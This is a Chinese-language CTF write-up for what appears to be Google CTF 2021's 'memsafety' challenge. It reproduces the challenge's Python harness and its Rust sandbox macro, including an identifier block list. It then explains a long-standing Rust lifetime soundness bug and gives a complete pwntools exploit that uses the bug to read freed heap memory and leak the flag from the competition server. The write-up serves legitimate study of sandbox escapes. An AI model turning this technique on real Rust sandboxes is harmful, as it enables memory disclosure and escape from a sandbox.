## Rev

### Cpp

- `gcc -E -dD <target>` 可以看到 expand macro definition



## Pwn

chall.py:

```python
# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


import os
import shutil
import subprocess
import sys
import json

def socket_print(string):
    print("=====", string, flush=True)


def get_user_input():
    socket_print("Enter partial source for edge compute app (EOF to finish):")
    user_input = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line == "EOF":
            break
        user_input.append(line)
    socket_print("Input accepted!")
    return user_input


def write_to_rs(contents):
    socket_print("Writing source to disk...")
    rs_prelude = """#![no_std]
    use proc_sandbox::sandbox;

    #[sandbox]
    pub mod user {
        // BEGIN PLAYER REPLACEABLE SECTION
    """.splitlines()
    print('\n'.join(rs_prelude))
    with open('/home/user/sources/user-0/src/lib.rs', 'w') as fd:
        fd.write('\n'.join(rs_prelude))
        fd.write('\n'.join(contents))
        fd.write("\n}\n")

def check_user_input():
    socket_print("Validating user input before compiling...")
    result = subprocess.run("/home/u1f383/.rustup/toolchains/1.47.0-x86_64-unknown-linux-gnu/bin/rustc user-0/src/lib.rs -Zast-json=yes", cwd="/home/user/sources", shell=True, timeout=150, capture_output=True)
    try:
        ast = json.loads(result.stdout)
        if len(ast["module"]["items"]) != 5:
            socket_print("Module escaping detected, aborting.")
            sys.exit(1)

    except json.JSONDecodeError:
        socket_print("Something went wrong during validation -- is your input malformed?")
        sys.exit(1)

def build_challenge():
    socket_print("Building edge compute app...")
    if os.path.exists("/tmp/chal-build"):
        shutil.rmtree("/tmp/chal-build")
    shutil.copytree("/home/user/build-cache", "/tmp/chal-build")
    # `rustc --version` == "rustc 1.47.0"
    result = subprocess.run("PATH=/usr/bin:$PATH LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu/ CARGO_TARGET_DIR=/tmp/chal-build /home/u1f383/.cargo/bin/cargo build --frozen --offline", cwd="/home/user/sources", shell=True, timeout=150) # output directory in /tmp/chal-build/debug/
    if result.returncode:
        socket_print("non-zero return code on compilation: " + str(result.returncode))
        sys.exit(1)
    socket_print("Build complete!")


def run_challenge():
    socket_print("Testing edge compute app...")
    result = subprocess.run("/tmp/chal-build/debug/server", shell=True, timeout=10)
    socket_print("Test complete!")


def main():
    user_input = get_user_input() # 讀 code
    write_to_rs(user_input) # 寫 .rs
    build_challenge() # build rust package

    # Check user input after building since the compilation in check_user_input() will
    # generate errors after generating the ast since the compilation command is
    # incomplete. Let the proper build run first so users can be presented with any
    # compilation issues, then validate it before we actually run.
    check_user_input() # rustc user-0/src/lib.rs -Zast-json=yes

    run_challenge()


if __name__ == "__main__":
    main()
```

- `--frozen`: Require Cargo.lock and cache are up to date
- `--offline`: Run without accessing the network
- `--build`: Compile the current package

`-Zast-json=yes` 的格式像是:

```json
In [9]: ast['module']['items'][0]                                             
Out[9]: 
{'attrs': [{'kind': {'variant': 'Normal',
    'fields': [{'path': {'span': {'lo': 0, 'hi': 0},
       'segments': [{'ident': {'name': 'prelude_import',
          'span': {'lo': 0, 'hi': 0}},
         'id': 4,
         'args': None}],
       'tokens': None},
      'args': 'Empty',
      'tokens': None}]},
   'id': None,
   'style': 'Outer',
   'span': {'lo': 0, 'hi': 0}}],
 'id': 5,
 'span': {'lo': 0, 'hi': 0},
 'vis': {'kind': 'Inherited', 'span': {'lo': 0, 'hi': 0}, 'tokens': None},
 'ident': {'name': '', 'span': {'lo': 0, 'hi': 0}},
 'kind': {'variant': 'Use',
  'fields': [{'prefix': {'span': {'lo': 0, 'hi': 0},
     'segments': [{'ident': {'name': '{{root}}', 'span': {'lo': 0, 'hi': 0}},
       'id': 6,
       'args': None},
      {'ident': {'name': 'core', 'span': {'lo': 0, 'hi': 0}},
       'id': 7,
       'args': None},
      {'ident': {'name': 'prelude', 'span': {'lo': 0, 'hi': 0}},
       'id': 8,
       'args': None},
      {'ident': {'name': 'v1', 'span': {'lo': 0, 'hi': 0}},
       'id': 9,
       'args': None}],
     'tokens': None},
    'kind': 'Glob',
    'span': {'lo': 0, 'hi': 0}}]},
 'tokens': None}
```

Rust preinclude sample: 

```rust
#![no_std]
    use proc_sandbox::sandbox;

    #[sandbox]
    pub mod user {
        // BEGIN PLAYER REPLACEABLE SECTION
        // ------------------------------
       	USER CODE
        // ------------------------------
	}
```

而 CODE (input) 有一些限制:

```python
        if len(ast["module"]["items"]) != 5:
            socket_print("Module escaping detected, aborting.")
            sys.exit(1)
```

先看程式進入點 `server`，建立了兩個 `Service`:

```rust
use prelude::Service;
fn main() {
    let mut services: Vec<Box<dyn Service>> = vec![
        user_0::user::State::new(),
        user_1::user::State::new(),
    ];
    for service in &mut services {
        service.handle("test query");
    }
}
```

- `let`: introduce a new set of variables into the current scope, as given by a pattern
- `mut`: 有兩種功能
  - **mutable variables**, which can be used anywhere you can bind a value to a variable name
  - **must be unique**: no other variables can have a mutable reference, nor a shared reference
- `vec`: vec! macro is provided to make initialization more convenient

user1:

```rust
// /user-1/src/lib.rs

#![no_std]
use proc_sandbox::sandbox;

#[sandbox]
pub mod user {
    static FLAG: &'static str = "CTF{fake flag}";
    use prelude::{mem::ManuallyDrop, Service, Box, String};
    pub struct State(ManuallyDrop<String>); // new a State struct
    impl State {
        pub fn new() -> Box<dyn Service> {
            Box::new( State(ManuallyDrop::new(String::from(FLAG))) )
        }
    }
    // implement a "Service" trait for struct "State"
    impl Service for State {
       fn handle(&mut self, _: &str) {}
    }
}
```

- `no_std`: 加上`#![no_std]`屬性的Rust函式庫內就無法去使用`std`這個 crate 下的所有功能
- `mod`: Use `mod` to create new modules to encapsulate code, including other modules
- `struct State(ManuallyDrop<String>)`: 建立一個 `State` struct，需要傳入 `ManuallyDrop<String>`
  - `ManuallyDrop`: control the drop order, but this requires unsafe code and is hard to do correctly in the presence of unwinding，所以就不會自動 drop
- `impl`: Implement some functionality for a type
- `Box`: A pointer type for heap allocation
- `dyn`: used to highlight that calls to methods on the **associated Trait are dynamically dispatched**
- `prelude`: a collection of names that are automatically brought into scope of every module in a crate
- `pub`: Make an item visible to others
- `impl Trait for Struct`: implements the trait `Trait` for the struct `Struct`. This results in the methods of the trait being available for `Struct`
- `handle`: 
  - A handle trait for asynchronous context pipeline
  - Maintain context in multiple handlers
- `&mut self`: means a mutable reference to `self`. This reference type allows you to modify `self` without taking ownership of it
- `&str`: one of the two main string types (the other is `String`), and its contents are borrowed
  - `_: &str`: 傳入的 `_` 的 type 為 `&str`，不過 `_` 為 ignore parameter，基本上 user1 什麼事情都不做

看起來 flag 在 user1 這邊，但是 `handle(&mut self, _: &str) {}` 卻不做任何行為。



prelude:

```rust
pub use std::io::Read;
pub use std::io::Result as IoResult;
pub use std::vec::Vec;
pub use std::println as log;
pub use std::string::String;
pub use std::str;
pub use std::mem;
pub use std::boxed::Box;

pub trait Service {
    fn handle(&mut self, query: &str);
}
```



sandbox:

```rust
/*
    Copyright 2021 Google LLC

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        https://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
*/
use proc_macro::TokenStream;
use quote::ToTokens;
use syn::visit::Visit;
use syn::{parse_macro_input, ExprUnsafe, ForeignItem, Ident, Item, ItemExternCrate};

struct Sandbox;
const BLOCKLIST: &[&str] = &[
    "env",
    "file",
    "include",
    "include_bytes",
    "include_str",
    "option_env",
    "std",
];

impl<'ast> Visit<'ast> for Sandbox {
    fn visit_expr_unsafe(&mut self, _: &'ast ExprUnsafe) {
        panic!("Unsafe is not allowed");
    }
    fn visit_foreign_item(&mut self, _: &'ast ForeignItem) {
        panic!("Linking to external symbols is not allowed");
    }
    fn visit_item_extern_crate(&mut self, _: &'ast ItemExternCrate) {
        panic!("Extern declarations are not allowed");
    }
    fn visit_ident(&mut self, ident: &'ast Ident) {
        // We could loosen this to only direct macro usage or use-rebinding
        if BLOCKLIST.iter().any(|blocked_ident| ident == blocked_ident) {
            panic!("Please don't try to access the compilation environment");
        }
    }
}

fn sandbox_item(item: Item) -> Item {
    Sandbox.visit_item(&item);
    item
}

#[proc_macro_attribute]
pub fn sandbox(_attr: TokenStream, item_tokens: TokenStream) -> TokenStream {
    let item = parse_macro_input!(item_tokens as Item);
    TokenStream::from(sandbox_item(item).into_token_stream())
}
```

- `Visit`: Each method of the Visit trait is a hook that can be overridden to customize the behavior when visiting the corresponding type of node
  - `syn::ExprUnsafe`: `unsafe { ... }`
  - `syn::ForeignItem`: An item within an extern block
  - `syn::ItemExternCrate`: An extern crate item: extern crate serde
  - `syn::Ident`: A word of Rust code, which may be a keyword or legal variable name
- `{... item}`: function finally return `item`
- `'ast`: a named lifetime and use the same lifetime for reference, having the same lifetime as a given input reference
  - named lifetimes are also used to indicate **the origin of a returned borrowed variable** to the rust compiler
- `#[proc_macro_attribute]`:
  - use `proc_macro` library to defined macro definitions such as function-like macros `#[proc_macro]`
  - `(TokenStream, TokenStream) -> TokenStream`
- `parse_macro_input!`: Parse the input TokenStream of a macro, triggering a compile error if the tokens fail to parse
  - Macros use `!` to distinguish them from normal method calls

目標應該是必須要使用 user0 以及避免 sandbox 的 blacklist，存取到 user1 的 `FLAG`。

```
// file
/tmp/chal-build/debug/server: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d404d145639484f7b2bc8ddabb40d2fa0a7d3cd8, for GNU/Linux 3.2.0, with debug_info, not stripped

// checksec
[*] '/tmp/chal-build/debug/server'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

`CTF{fake flag}` 會在 heap 上，並且 size 為 0x20，雖然 remote 應該會有不同，不過先假定 flag 在附近。

[這篇文章](https://hydrogen5.github.io/2020/03/09/Rust%E4%B9%8B%E6%AE%87%E2%80%94%E2%80%94%E5%AE%89%E5%85%A8%E7%9A%84%E8%BE%B9%E7%95%8C/#%E9%80%83%E7%A6%BB%E4%BC%8A%E7%94%B8)簡單介紹了過去一個 rust 的洞，可以做到任意讀寫，看了一下 issue 發現現在還沒修好，後續找了一些關於 nightly 1.47.0~1.48.0 的 issue，也沒發現沒什麼特別的，因此嘗試使用這個洞來 exploit。

其中有做了一些修正，因為 `Vec` 或是 `Box` memory allocation 的大小有些變化，不過都是要讓 `let mut x: Vec<i64> = Vec::new();` 可以寫到過去 `let mut b = Vec::new();` 所產生的 memory region，並且將原本的 data pointer inject 成指定位置，之後再用 `pa` 去讀指定做 leak 即可。user-1 flag 的位置可以用 `gdb search -s "CTF{fake flag}"` 找到。



簡單介紹一下 [rust 的洞](https://github.com/rust-lang/rust/issues/25860):

```rust
static UNIT: &'static &'static () = &&();

fn foo<'a, 'b, T>(_: &'a &'b (), v: &'b T) -> &'a T {
    v
}

fn bad<'b, T>(x: &'b T) -> &'static T {
    let f: fn(_, &'b T) -> &'static T = foo;
    f(UNIT, x)
}
```

- `UNIT` 是一個 type 為 `&'static &'static ()` 的 global variable，`&'static &'static ()` 為指向 tatic reference of static reference 的 function
- `foo<'a, 'b, T>(_: &'a &'b (), v: &'b T) -> &'a T` 為 template function，有三個參數 `'a`, `'b`, `T`
  - 第一個 parameter `_` 會隱式 (Implicit) 要求 `'b: 'a`，因為 inner reference (`'b`) 的生命週期會比外層 (`'a`) 還常
  - 第二個參數會直接回傳 v，並且 `'b T` -> `'a T`
- `bad<'b, T>(x: &'b T) -> &'static T` 接收任意的 reference `&'b T`，回傳 static reference `&'static T`，但是 assign `foo` to `f` 時會發生問題。當 `fn(_, &'b T)` 沒有第一個參數時，`foo` 選擇 `<'static, 'b , T>` 來做單態，但是這不符合 `'b: 'a`，因此呼叫 `f(UNIT, x)` 後，reference 可以一直保留 (因為是 `static`)



exploit:

```python
#!/usr/bin/python3

from pwn import *

flag = b""

for off in range(33, -9, -5):
    r = remote('memsafety.2021.ctfcompetition.com', 1337)
    payload = """
    use prelude::{mem::ManuallyDrop, Service, Box, String, Vec, log};
            static FLAG: &'static str = "TEST";
            pub struct State(ManuallyDrop<String>);
            impl State {
                pub fn new() -> Box<dyn Service> {
                    Box::new( State(ManuallyDrop::new(String::from(FLAG))) )
                }
            }

            static UNIT: &'static &'static () = &&();
            fn foo<'a, 'b, T>(_: &'a &'b (), v: &'b T) -> &'a T {
                v
            }

            fn bad<'b, T>(x: &'b T) -> &'static T {
                let f: fn(_, &'b T) -> &'static T = foo;
                f(UNIT, x)
            }
            
            impl Service for State {
                fn handle(&mut self, a: &str) {
                    let mut pa;
                    {
                        // 0x60
                        let mut b = Vec::new();
                        for i in 0..0x60 {
                            b.push(String::from("aaaaa"));
                        }
                        pa = bad(&b);
                        log!("{:p}", pa); // 0x00005555555adb00 -> (raw_ptr, len, capability)
                    }
                    log!("{:p}", pa); // 0x00005555555adb00 -> 0
                    {
                        // 0x20
                        let mut x: Vec<i64> = Vec::new();
                        for i in 0..0xb0 {
                            x.push(0x10);
                        }
                        let m = x.as_ptr() as i64;
                        x.push(m - 0x000f00 - """ + str(off) + """);
                        log!("{:x}", m);
                        log!("{:p}", &x);
                        log!("{:?}", pa[2]);
                    }
                }
            }
    """ + "\nEOF\n"
    r.send(payload)
    r.recvuntil('===== Testing edge compute app...')
    flag += r.recvuntil('\n===== Test complete!', drop=True).split(b'\n')[-1].replace(b'"', b'')
    r.close()

print(flag)
```



- [setup environ + document](https://doc.rust-lang.org/cargo/getting-started/installation.html)
  - **cargo**: the package manager and create host for rust
    - install: `curl https://sh.rustup.rs -sSf | sh`
    - `Cargo.toml`: 一個 manifest (清單)，可以在內指定不同 metadata 的 file (自己寫)
    - `Cargo.lock`: 包含有相關 dependency 的資訊，由 Cargo 本身維護/更新
  - nightly
    - 特定版本 (rust 1.47.0 + nightly) install: `rustup toolchain add nightly-2020-07-23 --profile minimal`
    - `rustup toolchain list -v` 可以看 toolchain 的位置
    - `rustup toolchain remove <toolchains>`: 解除安裝
  - `rustc`: rust compiler
- 使用 pwngdb debug rust 時 u16 會找不到，可以用 `set language c` -> `set language rust` 來解決
- [github search](https://docs.github.com/en/github/searching-for-information-on-github/searching-on-github/searching-issues-and-pull-requests) 增加搜尋速度
  - `unsound` / `bug` tag 與安全/功能相關

